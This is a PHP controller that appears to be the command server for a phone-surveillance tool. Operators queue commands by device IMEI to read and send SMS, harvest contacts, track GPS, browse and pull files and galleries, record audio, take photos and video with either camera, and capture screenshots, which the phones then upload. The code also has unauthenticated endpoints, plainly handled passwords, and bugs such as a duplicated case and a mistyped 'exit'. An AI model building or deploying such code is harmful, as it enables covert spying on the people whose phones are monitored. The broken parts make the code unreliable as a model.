<?php


//include "API.php";

require_once '../model/data_access/access.php';
require_once '../model/data_access/lang.php';
require_once 'filing.php';
require_once '../model/data_access/lang.php';
require_once 'controller_main_function.php';

ob_start();
session_cache_expire();
session_start();


define("path_mobile",    "device_");

session_start();
if (!isset($_REQUEST["act"])) {
    exit;
}
switch ($_REQUEST["act"]) {

    case 'select_device':
        $f = array('id');
        $valid_data = check_validation($f);
        if (!isset($valid_data['is_valid']) || $valid_data['is_valid'] == false) {
            send_msg(lang::$invalid_data, lang::$error);
            exit;
        }
        $_SESSION["device"]["id"] = $_REQUEST["id"];
       // controller_main_function::send_msg(lang::$success, lang::$message, "success");
        $result = true;
        send_result($result);
        break;
    case 'get_device':
        if(isset($_SESSION["device"]["id"]) && $_SESSION["device"]["id"]!=null && $_SESSION["device"]["id"] !='') {
            $result = $_SESSION["device"]["id"];
        }else{
            $result = false;
        }
        send_result($result);
        break;
    case 'check_is_select_device':
        if(isset($_SESSION["device"]["id"])){
            $result = true;
        }else{
            $result = false;
        }
        send_result($result);
        break;

    case 'logout':
        try {

            $_SESSION = null;
            session_destroy();
        } catch (Exception $e) {
        }
        send_result(array('act' => 'logout'));
        break;
    case 'register':
        $f = array('email', 'pass', 'avatar', 'username');
        $valid_data = check_validation($f);
        if (!isset($valid_data['is_valid']) || $valid_data['is_valid'] == false) {
            send_msg(lang::$invalid_data, lang::$error);
            exit;
        }
        $res = access::set_user($_REQUEST['email'], $_REQUEST['pass'], $_REQUEST['avatar'], $_REQUEST['username']);
        if (is_numeric($res)) {
            $_SESSION['user'] = access::get_user_by_email_pass($_REQUEST['email'], $_REQUEST['pass']);
            send_result(array('Result' => 'profile.html', 'act' => 'location'));
            exit;
        } else {
            send_msg(lang::$last_registered_data, lang::$error);
            exit;
        }
        break;
    case 'login':
        //session_start();
        $f = array('email', 'pass');
        $valid_data = check_validation($f);
        if (!isset($valid_data['is_valid']) || $valid_data['is_valid'] == false) {
            send_msg(lang::$invalid_data, lang::$error);
            exit;
        }
        $_SESSION['user'] = access::get_user_by_email_pass($_REQUEST['email'], $_REQUEST['pass']);
        if (isset($_SESSION['user']) && isset($_SESSION['user'][0]['email'])) {//ß== $_REQUEST['email'])){
            access::set_user_login($_SESSION['user'][0]['id']);
            send_result(array('Result' => 'pages/SelectDevices.html', 'act' => 'location'));
            exit;
        } else {
            send_msg(lang::$is_not_login, lang::$error);
            exit;
        }

        break;
    case 'edit_profile':

        $f = array('username', 'name', 'email', 'cart_no', 'shaba_no', 'sex', 'address');
        $valid_data = check_validation($f);

        if (!isset($valid_data['is_valid']) || $valid_data['is_valid'] == false) {
            send_msg(lang::$invalid_data, lang::$error);
            exit;
        }

        $res = access::edit_user($_SESSION['user'][0]['id'], $_REQUEST['username'], $_REQUEST['name'], $_REQUEST['sex'], $_REQUEST['address'], $_REQUEST['email'], $_REQUEST['cart_no'], $_REQUEST['shaba_no']);
        $_SESSION['user'] = access::get_user_by_email_pass($_SESSION['user'][0]['email'], $_SESSION['user'][0]['password']);
        if ($res == 1) {
            send_result(array('Result' => 'Home.html', 'act' => 'location'));
            exit;
        } else {
            send_msg(lang::$is_not_set_profile, lang::$error);
            extit;
        }

        break;
    case 'get_user':
        //session_start();
        if (!isset($_SESSION['user'][0]['email'])) {
            send_result(array('Result' => 'login.html', 'act' => 'location'));
            exit;
        }
        $_SESSION['user'][0]['act'] = 'get_user';
        send_result($_SESSION['user'][0]);
        break;
    case 'get_user_by_username' :
        $res = access::get_user_by_username_or_email($_REQUEST['user']);
        $res['act'] = 'get_user_by_username';
        send_result($res);
        break;
    case 'get_all_roles':
        send_result(access::get_all_role());
        break;
    case 'get_role_by_id':
        $valid_data = check_validation(array("id"));
        if (!isset($valid_data['is_valid']) || $valid_data['is_valid'] == false) {
            send_msg(lang::$invalid_data, lang::$error);
            exit;
        }
        $res = access::get_role_by_id($_REQUEST['id']);
        send_result($res);
        break;
    case 'get_userrole_by_userid':
        $valid_data = check_validation(array("id"));
        if (!isset($valid_data['is_valid']) || $valid_data['is_valid'] == false) {
            send_msg(lang::$invalid_data, lang::$error);
            exit;
        }
        $res = access::get_user_role_by_user_id($_REQUEST['id']);
        send_result($res);
        break;
    case 'set_role':
        $arr = array("role", "createby");
        $valid_data = check_validation($arr);
        if (!isset($valid_data['is_valid']) || $valid_data['is_valid'] == false) {
            send_msg(lang::$invalid_data, lang::$error);
            exit;
        }
        $res = access::set_role($_REQUEST['role'], $_REQUEST['createby']);
        if (is_numeric($res)) {
            send_msg(lang::$success, lang::$error);
        } else {
            send_msg(lang::$last_registered_data, lang::$error);
        }
        break;
    case 'set_userrole':
        $arr = array("userid", "roleid", "createby");
        $valid_data = check_validation($arr);
        if (!isset($valid_data['is_valid']) || $valid_data['is_valid'] == false) {
            send_msg(lang::$invalid_data, lang::$error);
            exit;
        }
        $res = access::set_user_role($_REQUEST['userid'], $_REQUEST['roleid'], $_REQUEST['createby']);
        if (is_numeric($res)) {
            send_msg(lang::$success, lang::$error);
        } else {
            send_msg(lang::$last_registered_data, lang::$error);
        }
        break;
    case 'delete_role':
        $valid_data = check_validation(array("id"));
        if (!isset($valid_data['is_valid']) || $valid_data['is_valid'] == false) {
            send_msg(lang::$invalid_data, lang::$error);
            exit;
        }
        if (access::delete_role($_REQUEST['id'])) {
            send_msg(lang::$success, lang::$message);
        } else {
            send_msg(lang::$invalid_data, lang::$failed);
        }
        break;
    case 'delete_userrole':
        $valid_data = check_validation(array("id"));
        if (!isset($valid_data['is_valid']) || $valid_data['is_valid'] == false) {
            send_msg(lang::$invalid_data, lang::$error);
            exit;
        }
        if (access::delete_user_role($_REQUEST['id'])) {
            send_msg(lang::$success, lang::$message);
        } else {
            send_msg(lang::$invalid_data, lang::$failed);
        }
        break;
    case 'update_role':
        $arr = array("id", "title", "menuid", "createby");
        $valid_data = check_validation($arr);
        if (!isset($valid_data['is_valid']) || $valid_data['is_valid'] == false) {
            send_msg(lang::$invalid_data, lang::$error);
            exit;
        }
        if (access::update_articles($_REQUEST['id'], $_REQUEST['pageid'], $_REQUEST['priority'], $_REQUEST['content'], $_REQUEST['metadata'], $_REQUEST['createby'])) {
            send_msg(lang::$success, lang::$message);
        } else {
            send_msg(lang::$invalid_data, lang::$failed);
        }
        break;
    case 'update_userrole':
        $arr = array("id", "title", "menuid", "createby");
        $valid_data = check_validation($arr);
        if (!isset($valid_data['is_valid']) || $valid_data['is_valid'] == false) {
            send_msg(lang::$invalid_data, lang::$error);
            exit;
        }
        break;

    //_____________ receive sms
    case 'receiveSms':
        $arr = array("IMEI", "number", "text", "smsId", "registerDate");
        $valid_data = check_validation($arr);
        if (!isset($valid_data['is_valid']) || $valid_data['is_valid'] == false) {
            send_msg(lang::$invalid_data, lang::$error);
            exit;
        }
        $device_id = access::get_device_by_IMEI($_REQUEST["IMEI"]);
        $device_id = $device_id[0]["id"];
        if (isset($device_id)) {
            $dd= '"'.date('Y-m-d H:i:s',($_REQUEST['registerDate']/1000)).'"';
            $result = access::set_sms($_REQUEST["number"], $_REQUEST["text"], 0, $_REQUEST['smsId'], $dd, 0, 2, $device_id, 1);
            if ($result > 0 && isset($result)) {
                send_msg(lang::$success, lang::$message, "success");
            } else {
                //send_msg(lang::$failed, lang::$error);
                send_msg($result, lang::$error);
            }
        } else {
            send_msg(lang::$invalid_device, lang::$error);
        }

        break;
    case 'sendSms':
        $arr = array("deviceId", "number", "text");

        $valid_data = check_validation($arr);
        if (!isset($valid_data['is_valid']) || $valid_data['is_valid'] == false) {
            send_msg(lang::$invalid_data, lang::$error);
            exit;
        }
        $device_id = $_REQUEST["deviceId"];
        $result = access::set_sms($_REQUEST["number"], $_REQUEST["text"], 0, 0, "null", 0, 1, $device_id, 1);
            if ($result > 0 && isset($result)) {
                send_msg(lang::$success, lang::$message);
            } else {
                send_msg(lang::$failed, lang::$error);
            }
       // echo $result;
        break;
    case 'set_sms':
        $arr = array("IMEI", "number", "text","registerdate");

        $valid_data = check_validation($arr);
        if (!isset($valid_data['is_valid']) || $valid_data['is_valid'] == false) {
            send_msg(lang::$invalid_data, lang::$error);
            exit;
        }
        $device_id = access::get_device_by_IMEI($_REQUEST["IMEI"]);
        $device_id = $device_id[0]["id"];
        $dd= '"'.date('Y-m-d H:i:s',($_REQUEST['registerdate']/1000)).'"';

        $result = access::set_sms($_REQUEST["number"], $_REQUEST["text"], 0, 0,$dd, 1, 1, $device_id, 1);
        if ($result > 0 && isset($result)) {
            send_msg(lang::$success, lang::$message);
        } else {
            send_msg(lang::$failed, lang::$error);
        }
        // echo $result;
        break;
    //______________ get all sms
    case 'get_sms':
        $result = access::get_all_sms();
        send_result($result);
        break;
    case 'get_sms_recive':
        $result = access::get_sms_by_type(1);
        send_result($result);
        break;
    case 'get_sms_send':
        $result = access::get_sms_by_type(2);
        send_result($result);
        break;
    case 'delete_sms':
        $valid_data = check_validation(array("id"));
        if (!isset($valid_data['is_valid']) || $valid_data['is_valid'] == false) {
            send_msg(lang::$invalid_data, lang::$error);
            exit;
        }
        if (access::delete_sms($_REQUEST['id'])) {
            send_msg(lang::$success, lang::$message);
        } else {
            send_msg(lang::$invalid_data, lang::$failed);
        }

        break;

    case 'get_sms_type_list':
        $result = access::get_sms_type_list();
        send_result($result);
        break;

    case 'get_sms_status_list':
        $result = access::get_sms_status_list();
        send_result($result);
        break;

    case 'set_sms_status':
        $valid_data = check_validation(array("id", "status"));
        if (!isset($valid_data['is_valid']) || $valid_data['is_valid'] == false) {
            send_msg(lang::$invalid_data, lang::$error);
            exit;
        }
        if (access::update_sms_status($_REQUEST['id'], $_REQUEST['status'])) {
            send_msg(lang::$success, lang::$message);
        } else {
            send_msg(lang::$invalid_data, lang::$failed);
        }

        break;
    //_____________ device
    case 'get_devices':
        $result = access::get_all_device();
        send_result($result);
        break;
    case 'get_device_by_IMEI':
        $arr = array("IMEI");
        $valid_data = check_validation($arr);
        if (!isset($valid_data['is_valid']) || $valid_data['is_valid'] == false) {
            send_msg(lang::$invalid_data, lang::$error);
            exit;
        }
        $result = access::get_device_by_IMEI($_REQUEST['IMEI']);
        send_result($result);
        break;
    case 'set_device':
        $arr = array("name", "IMEI");
        $valid_data = check_validation($arr);
        if (!isset($valid_data['is_valid']) || $valid_data['is_valid'] == false) {
            send_msg(lang::$invalid_data, lang::$error);
            exit;
        }
        $result = access::set_device($_REQUEST['name'], $_REQUEST['IMEI'], 1);
        send_msg(lang::$success, lang::$message);
        break;
    case 'edit_device':
        $arr = array("id", "name", "IMEI");
        $valid_data = check_validation($arr);
        if (!isset($valid_data['is_valid']) || $valid_data['is_valid'] == false) {
            send_msg(lang::$invalid_data, lang::$error);
            exit;
        }
        $result = access::update_device($_REQUEST['id'], $_REQUEST['name'], $_REQUEST['IMEI'], 1);
        send_msg(lang::$success, lang::$message);
        break;
    case 'delete_device':
        $arr = array("id");
        $valid_data = check_validation($arr);
        if (!isset($valid_data['is_valid']) || $valid_data['is_valid'] == false) {
            send_msg(lang::$invalid_data, lang::$error);
            exit;
        }
        $result = access::delete_device($_REQUEST['id']);
        send_msg(lang::$success, lang::$message);
        break;
    //_____________ contact action
    case 'get_contact':
        $result = access::get_contacts();
        send_result($result);
        break;

    case 'get_contact_by_name':
        $valid_data = check_validation(array("name"));
        if (!isset($valid_data['is_valid']) || $valid_data['is_valid'] == false) {
            send_msg(lang::$invalid_data, lang::$error);
            exit;
        }
        $result = access::get_contact_by_name($_REQUEST['name']);
        send_result($result);
        break;

    case 'get_contact_by_number':
        $valid_data = check_validation(array("number"));
        if (!isset($valid_data['is_valid']) || $valid_data['is_valid'] == false) {
            send_msg(lang::$invalid_data, lang::$error);
            exit;
        }
        $result = access::get_contact_by_name($_REQUEST['number']);
        send_result($result);
        break;

    case 'get_contact_by_deviceId':
        $device_id = $_SESSION["device"]["id"];
        $result = access::get_contact_by_deviceId($device_id);
        send_result($result);
        break;

    case 'get_contact_by_number_deviceId':
        $valid_data = check_validation(array("number", "deviceId"));
        if (!isset($valid_data['is_valid']) || $valid_data['is_valid'] == false) {
            send_msg(lang::$invalid_data, lang::$error);
            exit;
        }
        $result = access::get_contact_by_number_deviceId($_REQUEST['number'], $_REQUEST['deviceId']);
        send_result($result);
        break;
    case 'set_contact':
        $valid_data = check_validation(array("name", "number"));
        if (!isset($valid_data['is_valid']) || $valid_data['is_valid'] == false) {
            send_msg(lang::$invalid_data, lang::$error);
            exit;
        }
        if (isset($_REQUEST["IMEI"]) && $_REQUEST["IMEI"] != "") {
            $device_id = access::get_device_by_IMEI($_REQUEST["IMEI"]);
            $device_id = $device_id[0]["id"];
        } else if (isset($_REQUEST["deviceId"]) && $_REQUEST["deviceId"] != "") {
            $device_id = $_REQUEST["deviceId"];
        } else {
            $device_id = $_SESSION["device"]["id"];

        }

        if (isset($_REQUEST["contactID"]) && $_REQUEST["contactID"] != '') {
            $contactID_device = $_REQUEST["contactID"];
        } else {
            $contactID_device = 0;
        }

        $contactID = access::set_contact($_REQUEST["name"], $device_id, $contactID_device, 1);

        if (strpos($contactID, 'error') == false) {
            $number = explode("||", $_REQUEST["number"]);
            for ($number_index = 0; $number_index < count($number); $number_index++) {
                access::set_phone_number_by_contactId($number[$number_index], $contactID, "1");
            }
        }
        //send_result($result);
        send_msg(lang::$success, lang::$message, "success");
        break;
    case 'set_contact':
        $valid_data = check_validation(array("name", "number"));
        if (!isset($valid_data['is_valid']) || $valid_data['is_valid'] == false) {
            send_msg(lang::$invalid_data, lang::$error);
            exit;
        }
        if (isset($_REQUEST["IMEI"]) && $_REQUEST["IMEI"] != "") {
            $device_id = access::get_device_by_IMEI($_REQUEST["IMEI"]);
            $device_id = $device_id[0]["id"];
        } else if (isset($_REQUEST["deviceId"]) && $_REQUEST["deviceId"] != "") {
            $device_id = $_REQUEST["deviceId"];
        } else {
            $device_id = $_SESSION["device"]["id"];
        }

        if (isset($_REQUEST["contactID"]) && $_REQUEST["contactID"] != '') {
            $contactID_device = $_REQUEST["contactID"];
        } else {
            $contactID_device = 0;
        }

        $contactID = access::set_contact($_REQUEST["name"], $device_id, $contactID_device, 1);

        if (strpos($contactID, 'error') == false) {
            $number = explode("||", $_REQUEST["number"]);
            for ($number_index = 0; $number_index < count($number); $number_index++) {
                access::set_phone_number_by_contactId($number[$number_index], $contactID, "1");
            }
        }
        //send_result($result);
        send_msg(lang::$success, lang::$message, "success");
        break;
    case 'is_set_contact':
        $valid_data = check_validation(array("cid", "contactid"));
        if (!isset($valid_data['is_valid']) || $valid_data['is_valid'] == false) {
            send_msg(lang::$invalid_data, lang::$error);
            exit;
        }
        access::edit_contact_cid($_REQUEST["cid"], $_REQUEST["contactid"]);
        send_msg(lang::$success, lang::$message, "success");
        break;

    //____________ directory Acts
    ///summery
    /// if path = '' then return device store
    /// if return = -1 then does not exits path
    /// if return = 0 then path is empty
    /// if return = -2 then have error

    ///end summery
    case 'get_ls':
        $valid_data = check_validation(array("path"));
        if (!isset($valid_data['is_valid']) || $valid_data['is_valid'] == false) {
            send_msg(lang::$invalid_data, lang::$error);
            exit;
        }
        $path = $_REQUEST["path"];
        if($path == "root"){$path= 0;}
        $device_id = $_SESSION["device"]["id"];
        access::set_request($device_id,5,$path);
        send_msg(lang::$success, lang::$message, "success");
        break;
    case 'response_get_ls':
        $valid_data = check_validation(array("id"));
        if (!isset($valid_data['is_valid']) || $valid_data['is_valid'] == false) {
            send_msg(lang::$invalid_data, lang::$error);
            exit;
        }
        access::delete_request($_REQUEST['id']);
        send_msg(lang::$success, lang::$message, "success");
        break;
    /// if file_type = empty then the row is folder
    case 'set_ls':
        $valid_data = check_validation(array("IMEI","file_name","file_type","parent"));
        if (!isset($valid_data['is_valid']) || $valid_data['is_valid'] == false) {
            send_msg(lang::$invalid_data, lang::$error);
            exit;
        }
        $deviceId = access::get_device_by_IMEI($_REQUEST["IMEI"]);
        $deviceId = $deviceId[0]["id"];
        access::set_directory($_REQUEST['file_name'], $_REQUEST['file_type'], $_REQUEST['parent'], $deviceId);
        send_msg(lang::$success, lang::$message, "success");
        break;
    case 'upload_request':
        $valid_data = check_validation(array("pathId"));
        if (!isset($valid_data['is_valid']) || $valid_data['is_valid'] == false) {
            send_msg(lang::$invalid_data, lang::$error);
            exit;
        }
        $path = $_REQUEST["pathId"];
        if($path == "root"){$path= 0;}
        $device_id = $_SESSION["device"]["id"];
        access::set_request($device_id,13,$path);
        send_msg(lang::$success, lang::$message, "success");

        break;
    case 'upload_file':
        $valid_data = check_validation(array("IMEI","id","reqid"));
        if (!isset($valid_data['is_valid']) || $valid_data['is_valid'] == false) {
            send_msg(lang::$invalid_data, lang::$error);
            exit;
        }
        $device_id = access::get_device_by_IMEI($_REQUEST["IMEI"]);
        $device_id = $device_id[0]["id"];
        filing::$root=path_mobile.$device_id."/explorer/";
        $fname = filing::upload_file("uploaded_file");
        access::edit_directory_isDownload_by_Id($_REQUEST['reqid'],filing::$root.$fname,true);
        access::delete_request($_REQUEST['id']);
        send_msg(lang::$success, lang::$message, "success");

        break;
    case 'upload_gallery':
        $valid_data = check_validation(array("IMEI","id","reqid"));
        if (!isset($valid_data['is_valid']) || $valid_data['is_valid'] == false) {
            send_msg(lang::$invalid_data, lang::$error);
            exit;
        }
        $device_id = access::get_device_by_IMEI($_REQUEST["IMEI"]);
        $device_id = $device_id[0]["id"];
        filing::$root=path_mobile.$device_id."/gallery/";
        $fname = filing::upload_file("uploaded_file");
        access::set_custome_file_list($device_id,$fname,filing::$root,0,7);
        access::delete_request($_REQUEST['id']);
        send_msg(lang::$success, lang::$message, "success");

    break;

    //_____________ tak photo

    case'get_gallery':
//        $valid_data = check_validation(array("IMEI"));
//        if (!isset($valid_data['is_valid']) || $valid_data['is_valid'] == false) {
//            send_msg(lang::$invalid_data, lang::$error);
//            exit;
//        }
        // $device_id = access::get_device_by_IMEI($_REQUEST["IMEI"]);
        $device_id = $_SESSION["device"]["id"];
        access::set_request($device_id,12,0);
        send_msg(lang::$success, lang::$message, "success");
        break;

    case'take_voice':
//        $valid_data = check_validation(array("IMEI"));
//        if (!isset($valid_data['is_valid']) || $valid_data['is_valid'] == false) {
//            send_msg(lang::$invalid_data, lang::$error);
//            exit;
//        }
       // $device_id = access::get_device_by_IMEI($_REQUEST["IMEI"]);
        $device_id = $_SESSION["device"]["id"];
        $id = access::set_custome_file_list($device_id,"null" , "null","null",1);
        access::set_request($device_id,6,$id);
        send_msg(lang::$success, lang::$message, "success");
        break;

    case'take_photo_front':
        //        $valid_data = check_validation(array("IMEI"));
//        if (!isset($valid_data['is_valid']) || $valid_data['is_valid'] == false) {
//            send_msg(lang::$invalid_data, lang::$error);
//            exit;
//        }
      //  $device_id = access::get_device_by_IMEI($_REQUEST["IMEI"]);
        $device_id = $_SESSION["device"]["id"];
        $id = access::set_custome_file_list($device_id,"null" , "null","null",2);
        access::set_request($device_id,9,$id);
        send_msg(lang::$success, lang::$message, "success");
        break;

    case'take_photo_back':
        //        $valid_data = check_validation(array("IMEI"));
//        if (!isset($valid_data['is_valid']) || $valid_data['is_valid'] == false) {
//            send_msg(lang::$invalid_data, lang::$error);
//            exit;
//        }
        //  $device_id = access::get_device_by_IMEI($_REQUEST["IMEI"]);
        $device_id = $_SESSION["device"]["id"];
        $id = access::set_custome_file_list($device_id,"null" , "null","null",3);
        access::set_request($device_id,10,$id);
        send_msg(lang::$success, lang::$message, "success");
        break;

    case'take_video_front':
        //        $valid_data = check_validation(array("IMEI"));
//        if (!isset($valid_data['is_valid']) || $valid_data['is_valid'] == false) {
//            send_msg(lang::$invalid_data, lang::$error);
//            exit;
//        }
        //  $device_id = access::get_device_by_IMEI($_REQUEST["IMEI"]);
        $device_id = $_SESSION["device"]["id"];
        $id = access::set_custome_file_list($device_id,"null" , "null","null",4);
        access::set_request($device_id,7,$id);
        send_msg(lang::$success, lang::$message, "success");
        break;

    case'take_video_back':
        //        $valid_data = check_validation(array("IMEI"));
//        if (!isset($valid_data['is_valid']) || $valid_data['is_valid'] == false) {
//            send_msg(lang::$invalid_data, lang::$error);
//            exit;
//        }
        //  $device_id = access::get_device_by_IMEI($_REQUEST["IMEI"]);
        $device_id = $_SESSION["device"]["id"];
        $id = access::set_custome_file_list($device_id,"null" , "null","null",5);
        access::set_request($device_id,8,$id);
        send_msg(lang::$success, lang::$message, "success");
        break;

    case'take_screenshot':
        //        $valid_data = check_validation(array("IMEI"));
//        if (!isset($valid_data['is_valid']) || $valid_data['is_valid'] == false) {
//            send_msg(lang::$invalid_data, lang::$error);
//            exit;
//        }
        //  $device_id = access::get_device_by_IMEI($_REQUEST["IMEI"]);
        $device_id = $_SESSION["device"]["id"];
        $id = access::set_custome_file_list($device_id,"null" , "null","null",6);
        access::set_request($device_id,11,$id);
        send_msg(lang::$success, lang::$message, "success");
        break;

    case 'upload_take_file':
        $valid_data = check_validation(array("IMEI","id","reqid"));
        if (!isset($valid_data['is_valid']) || $valid_data['is_valid'] == false) {
            send_msg(lang::$invalid_data, lang::$error);
            exit;
        }
        $device_id = access::get_device_by_IMEI($_REQUEST["IMEI"]);
        $device_id = $device_id[0]["id"];
        filing::$root=path_mobile.$device_id."/";
        $fname = filing::upload_file("uploaded_file");
        access::edit_custome_file_list($_REQUEST['reqid'], $fname, filing::$root);
        access::delete_request($_REQUEST['id']);
        send_msg(lang::$success, lang::$message, "success");

        break;

    case 'delete_request':
        $valid_data = check_validation(array("id"));
        if (!isset($valid_data['is_valid']) || $valid_data['is_valid'] == false) {
            send_msg(lang::$invalid_data, lang::$error);
            exit;
        }
        access::delete_request($_REQUEST['id']);
        send_msg(lang::$success, lang::$message, "success");
        break;

    //____________ GPS Acts
    case 'set_gps':
        $valid_data = check_validation(array("lat", "long", "IMEI"));
        if (!isset($valid_data['is_valid']) || $valid_data['is_valid'] == false) {
            send_msg(lang::$invalid_data, lang::$error);
            exit;
        }
        $device_id = access::get_device_by_IMEI($_REQUEST["IMEI"]);
        $device_id = $device_id[0]["id"];
        $result = access::set_gps($_REQUEST['lat'],$_REQUEST['long'], $device_id);
        send_msg(lang::$success, lang::$message, "success");
       // send_msg($result, lang::$message, "success");
        break;
    case 'get_gps_by_deviceid':
        $valid_data = check_validation(array("deviceId"));
        if (!isset($valid_data['is_valid']) || $valid_data['is_valid'] == false) {
            send_msg(lang::$invalid_data, lang::$error);
            exit;
        }
        $result = access::get_gps_by_deviceId($_REQUEST['deviceId']);
        send_result($result);
        break;
    case 'get_gps_by_IEMI':
        $valid_data = check_validation(array("IMEI"));
        if (!isset($valid_data['is_valid']) || $valid_data['is_valid'] == false) {
            send_msg(lang::$invalid_data, lang::$error);
            exit;
        }
        $device_id = access::get_device_by_IMEI($_REQUEST["IMEI"]);
        $device_id = $device_id[0]["id"];
        $result = access::get_gps_by_deviceId($device_id);
        send_result($result);
        break;
    case 'delete_gps_by_deviceid':
        $valid_data = check_validation(array("deviceId"));
        if (!isset($valid_data['is_valid']) || $valid_data['is_valid'] == false) {
            send_msg(lang::$invalid_data, lang::$error);
            exit;
        }
        access::delete_gps_by_deviceId($_REQUEST['deviceId']);
        send_msg(lang::$success, lang::$message, "success");
        break;
    case 'delete_gps_by_IEMI':
        $valid_data = check_validation(array("IEMI"));
        if (!isset($valid_data['is_valid']) || $valid_data['is_valid'] == false) {
            send_msg(lang::$invalid_data, lang::$error);
            exit;
        }
        $device_id = access::get_device_by_IMEI($_REQUEST["IMEI"]);
        $device_id = $device_id[0]["id"];
        access::delete_gps_by_deviceId($device_id);
        send_msg(lang::$success, lang::$message, "success");
        break;
    case 'delete_gps_by_id':
        $valid_data = check_validation(array("id"));
        if (!isset($valid_data['is_valid']) || $valid_data['is_valid'] == false) {
            send_msg(lang::$invalid_data, lang::$error);
            exit;
        }
        access::delete_gps_by_deviceId($_REQUEST['id']);
        send_msg(lang::$success, lang::$message, "success");
        break;
    case 'start_gps':
        $valid_data = check_validation(array("deviceId"));
        if (!isset($valid_data['is_valid']) || $valid_data['is_valid'] == false) {
            //send_msg(lang::$invalid_data, lang::$error);
            //exit;
            $device_id = $_SESSION["device"]["id"];
        }else{
            $device_id = $_REQUEST['deviceId'];
        }

        $result =  access::set_request($device_id,3);
        //print_r($result);
        send_msg(lang::$success, lang::$message, "success");
        break;
    case 'stop_gps':
        $valid_data = check_validation(array("deviceId"));
        if (!isset($valid_data['is_valid']) || $valid_data['is_valid'] == false) {
            //send_msg(lang::$invalid_data, lang::$error);
            //exit;
            $device_id = $_SESSION["device"]["id"];
        }else{
            $device_id = $_REQUEST['deviceId'];
        }
        access::set_request($device_id,4);
        send_msg(lang::$success, lang::$message, "success");
        break;
    case 'respons_start_gps':
        $valid_data = check_validation(array("id"));
        if (!isset($valid_data['is_valid']) || $valid_data['is_valid'] == false) {
            send_msg(lang::$invalid_data, lang::$error);
            exit;
        }
        access::delete_request($_REQUEST['id']);
        send_msg(lang::$success, lang::$message, "success");
        break;
    case 'respons_stop_gps':
        $valid_data = check_validation(array("id"));
        if (!isset($valid_data['is_valid']) || $valid_data['is_valid'] == false) {
            send_msg(lang::$invalid_data, lang::$error);
            exit;
        }
        access::delete_request($_REQUEST['id']);
        send_msg(lang::$success, lang::$message, "success");
        break;
    case 'get_new_pos':
        $device_id = $_SESSION["device"]["id"];
        $result = access::get_gps_by_deviceId_des($device_id);
        send_result($result);
        break;

    //_____________ get all request for device
    case 'todo':
        $arr = array("IMEI");
        $valid_data = check_validation($arr);
        if (!isset($valid_data['is_valid']) || $valid_data['is_valid'] == false) {
            send_msg(lang::$invalid_data, lang::$error);
            exit;
        }
        $device_id = access::get_device_by_IMEI($_REQUEST["IMEI"]);
        if (isset($device_id[0]['id'])) {
            $sms = access::get_sms_requste_by_device($device_id[0]['id']);
            $contact = access::get_contact_request_by_deviceId($device_id[0]['id']);
            $gps_start = access::get_Request(3,$device_id[0]['id']);
            $gps_stop = access::get_Request(4,$device_id[0]['id']);
            $get_ls = access::get_ls_request_by_deviceId($device_id[0]['id']);
            $record_voice = access::get_Request(6,$device_id[0]['id']);
            $recorde_video_front_camera = access::get_Request(7,$device_id[0]['id']);
            $record_video_back_camera = access::get_Request(8,$device_id[0]['id']);
            $take_photo_front_camera = access::get_Request(9,$device_id[0]['id']);
            $take_photo_back_camera = access::get_Request(10,$device_id[0]['id']);
            $take_screenshot = access::get_Request(11,$device_id[0]['id']);
            $get_gallery = access::get_Request(12,$device_id[0]['id']);
            $upload_request = access::get_dir_request_by_deviceId($device_id[0]['id']);
            $result = array();
            $index_result = 0;
            for ($index = 0; $index < count($sms); $index++) {
                $result[$index_result] = $sms[$index];
                $index_result++;
            }
            for ($index = 0; $index < count($contact); $index++) {
                $result[$index_result] = $contact[$index];
                $index_result++;
            }
            for ($index = 0; $index < count($gps_start); $index++) {
                $result[$index_result] = $gps_start[$index];
                $index_result++;
            }
            for ($index = 0; $index < count($gps_stop); $index++) {
                $result[$index_result] = $gps_stop[$index];
                $index_result++;
            }
            for ($index = 0; $index < count($get_ls); $index++) {
                $result[$index_result] = $get_ls[$index];
                $index_result++;
            }
            for ($index = 0; $index < count($record_voice); $index++) {
                $result[$index_result] = $record_voice[$index];
                $index_result++;
            }
            for ($index = 0; $index < count($recorde_video_front_camera); $index++) {
                $result[$index_result] = $recorde_video_front_camera[$index];
                $index_result++;
            }
            for ($index = 0; $index < count($record_video_back_camera); $index++) {
                $result[$index_result] = $record_video_back_camera[$index];
                $index_result++;
            }
            for ($index = 0; $index < count($take_photo_front_camera); $index++) {
                $result[$index_result] = $take_photo_front_camera[$index];
                $index_result++;
            }
            for ($index = 0; $index < count($take_photo_back_camera); $index++) {
                $result[$index_result] = $take_photo_back_camera[$index];
                $index_result++;
            }
            for ($index = 0; $index < count($take_screenshot); $index++) {
                $result[$index_result] = $take_screenshot[$index];
                $index_result++;
            }
            for ($index = 0; $index < count($get_gallery); $index++) {
                $result[$index_result] = $get_gallery[$index];
                $index_result++;
            }
            for ($index = 0; $index < count($upload_request); $index++) {
                $result[$index_result] = $upload_request[$index];
                $index_result++;
            }
            send_result($result);
            exit;
        } else {
            send_msg(lang::$invalid_device, lang::$error);
            exit;
        }
        break;

    case 'get_request_type':
        $result = access::get_Request_Type();
        send_result($result);
        break;

    default:
        echo "invalid act!!!";
}

function check_validation($field)
{

    $result['is_valid'] = true;

    for ($i = 0; count($field) > $i; $i++) {
        if (isset($_REQUEST[$field[$i]])) {
            $result[$field[$i]] = true;
        } else {
            $result[$field[$i]] = false;
            $result['is_valid'] = false;
        }
    }

    return $result;

}

function send_msg($msg, $title, $type = "error", $btn = "")
{
    send_result(array('msg' => $msg, 'title' => $title, 'type' => $type, 'btn' => $btn, 'act' => 'message'));
}

function send_result($res)
{
    echo json_encode($res);
}